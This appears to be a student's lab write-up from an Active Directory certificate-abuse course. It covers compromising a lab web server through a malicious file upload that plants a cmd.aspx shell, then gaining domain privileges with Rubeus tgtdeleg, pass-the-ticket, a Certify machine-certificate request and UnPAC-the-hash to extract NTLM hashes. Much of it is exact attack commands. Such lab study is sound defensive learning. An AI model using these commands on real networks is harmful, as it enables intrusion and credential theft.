### Learning Objective - 1 : 

• Compromise the web application on cb-webapp1.
• Privilege Escalate using CertPotato to gain admin access on cb-webapp1.

#### Solution : 

- We have a compromised machine  -> Run Invisi shell -> Load Powershell AD-Module > Get-ADComputer -Filter * -Properties Name | ft Name,DNSHostname,IPV4Address -A
- We get a list of computers including cb-webapp1.certbulk.cb.corp > Run Nmap scan to identify port 443 is open
- A web app with no auth and file upload functionality is present on https://cb-webapp1.certbulk.cb.corp
- File Upload is vuln to RCE via Malicious File Upload (Uploading a cmd.aspx shell)
- Run : whomai we get : iis apppool\defaultapppool

- What is this iis apppool\defaultapppool
```
When IIS (Internet Information Services) runs a website, it does so inside a worker process called w3wp.exe.
Each website or group of sites runs in an Application Pool, which isolates one app from another — preventing one crashed or compromised site from affecting others.

Each Application Pool needs a Windows account to run under.
In modern IIS (since Windows Server 2008), that account is a virtual account of the form: IIS APPPOOL\<AppPoolName>

Example:
Default app pool → IIS APPPOOL\DefaultAppPool
A custom app pool called “MyApp” → IIS APPPOOL\MyApp
```

```
Virtual accounts are a special Windows security feature.
They:
Don’t exist as normal user accounts in Active Directory or Local Users.
Are automatically managed by Windows — no passwords, no need to create them manually.
Have their own unique SID (Security Identifier), which allows precise ACL (permission) configuration.
Are local to the machine — you won’t see them in AD or net user.
```

```
Why They Are Created

They exist for isolation and security.
Each app pool gets its own identity.
If one site gets compromised, the attacker’s code can only access what that app pool’s account has permissions for.
This is least privilege by design — apps run under a minimal-privilege account instead of a shared one like Network Service.
```

- Now we need to break out of this virtual account to a privileged account say administrator
- Start a smbserver on compromised machine using : smbserver.py -smb2support testshare .
- Try to connect to the share via obtained shell using: dir \\hostname\testshare$ we can see that authentication happens using cb-webapp1$ [$ means its a machine account] domain account instead of iis-apppool virtual account
- Thus we can try to use certpotato to perform a priv esc to Administrator
- We try to use tgtdeleg trick to fetch the TGT for the Machine Account
```
TgtDeleg:

1. When u login a TGT and session key is stored in memory but you cant access it or export it , hence we use tgtdeleg trick via S4U2self extension to export a TGT
2. Step 1: You're alice@company.com > Valid TGT in memory > TGT session key in memory
3. Step 2: Send SPECIAL TGS-REQ to Domain Controller : Hi Domain Controller,I'm Alice. Here's my TGT.Please give me a FORWARDABLE service ticket for HTTP/mycomputer.company.com using S4U2self (service for user to self)
4. Step 3: Domain Controller Processes SPECIAL Request.
        Because of S4U2self + forwardable, it does something unusual:
        Creates service ticket for HTTP/mycomputer But encrypts it with YOUR TGT session key instead of HTTP service's key and Puts your original TGT session key inside the ticket

5. Step 4: SPECIAL TGS-REP Message contains:
┌─────────────────────────────────┐
│ Service Ticket for HTTP/mycomputer │ ← Encrypted with YOUR TGT session key
│ (You CAN read this!)            │
├─────────────────────────────────┤
│ Your Original TGT Session Key   │ ← Inside the encrypted part
└─────────────────────────────────┘

6. Step 5: The Magic Happens: Since you already know your TGT session key, you can:
  Decrypt the service ticket (because it's encrypted with your key)
  Extract your TGT session key from inside
  Rebuild a full TGT using these components
```

- So we dump rubeus on the machine via cmd.aspx shell and run rubeus.exe tgtdeleg /nowrap -> Gives us the base64 TGT for cb-webapp1 > Copy this and inject this on the studentvm - compromised machine
- Command to inject the ticket : rubeus.exe ptt /ticket:<b64_TGT> -> Then do klist to view the injected TGT
- Now using the TGT we can issue a certificate using the machine template
        - Command : certify.exe request /ca:cb-ca.cb.corp\CB-CA /user:cb-webapp1$ /domain:certbulk.cb.corp /template:Machine
        - Save the cert as cb-webapp1.pem
        - Convert from pem to pfx using openssl
        - Command : openssl.exe pkcs12 -in 'cb-webapp1.pem' -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cb-webapp1.pfx
        - Provide the password : any random password

-  UnPAC the Hash :
```
Step 1: You Have a Certificate
- You possess cb-webapp1.pfx (certificate + private key)
- This gives you PKINIT authentication capability for cb-webapp1

Step 2: Request TGT via PKINIT
- Command : rubeus.exe asktgt /getcredentials /user:cb-webapp1 /certificate:cb-webapp1.pfx /password:password /domain:certbulk.cb.corp /dc:cb-dc.certbulk.cb.corp /show

Step 3: The PAC_CREDENTIAL_INFO Structure
TGT contains:
<img width="663" height="539" alt="image" src="https://github.com/user-attachments/assets/7f530878-7f1a-4e6f-8e61-9af0f259a0a7" />


Step 4: User-to-User (U2U) Authentication Trick
Here's the clever part. Instead of trying to directly decrypt the PAC, you:
Request a service ticket TO YOURSELF: # Ask for service ticket for cb-webapp1 to cb-webapp1. TGS-REQ: "Give me ticket for cb-webapp1@domain TO cb-webapp1@domain"

Why U2U?
- In U2U, the service ticket is encrypted with your session key (which you have)
- This means you can decrypt the service ticket
- The decrypted service ticket contains the same PAC_CREDENTIAL_INFO with NTLM hashes

Step 5: Extract NTLM Hashes
- Since you can decrypt the U2U service ticket (it's encrypted with your key), you can:
- Extract the PAC_CREDENTIAL_INFO structure
- Recover the NTLM hashes from inside it
```
           
